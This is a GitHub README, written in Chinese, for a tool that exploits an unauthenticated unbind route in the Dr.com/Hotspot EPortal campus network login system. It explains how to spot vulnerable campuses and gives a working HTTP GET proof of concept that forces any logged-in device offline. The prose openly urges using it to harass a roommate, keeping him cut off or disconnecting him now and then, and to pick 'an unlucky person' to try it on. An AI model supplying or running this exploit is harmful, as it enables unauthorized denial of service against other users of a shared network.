# Dr.com Eportal校园网认证系统未授权断网漏洞 -附脚本
<img width="1119" alt="image" src="https://github.com/Zaxk1337/DrcomCutdown/assets/164832393/f4107b1c-d880-4688-8a32-921a0b95406d">

# DrcomCutdown

😎测试版本:
  **Guangzhou Hotspot Software Technology Co., Ltd. © 2020   EPortal4.1.3**

🥳效果:
  你是否受够了室友半夜两三点还在激情csgo？是否受够了每当你正要进入梦乡和小美大战800回合的时候，你的室友突然在游戏中破防爆粗口？
  <br>
  Fine，Using this！
  <br>
  如果你家大学正在使用此款计费系统，那么恭喜你🎉，用此脚本可以将校园网内任意已登陆设备强制踹下线，实现断网效果，如果你足够聪明，你可以自己对脚本进行二次开发，一直让b狗娘养的夜战哥处于断网状态，或者隔三差五给他断网恶心他，还你宿舍一个清明。☝️
 
## 识别Recon
那么如何识别你校是否也存在此漏洞？
打开你的校园网认证界面，如果在任意位置你找到了包含*Guangzhou Hotspot Software Technology Co., Ltd* 或者 *本XX系统由广州热点软件科技股份有限公司提供*的Powerby信息，那么🎉con graduation，你所在的校园认证系统中很有可能存在此漏洞。赶紧挑个倒霉蛋试试吧🥚


# 原理 -Principle
由于未对unbind路由做验证，导致任意知道受害者内网ip地址的人员，在使用一个简易将ip地址转换为int整型数字的算法后(已附脚本，算法在脚本里面)，可以实现无授权解绑目标mac地址，实现断网效果。

***POC:***
```
GET /eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ipToParseIntValue计算后的ip整数值} HTTP/1.1
Host: {把我换成你家校园网登陆ip地址}:801
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
```
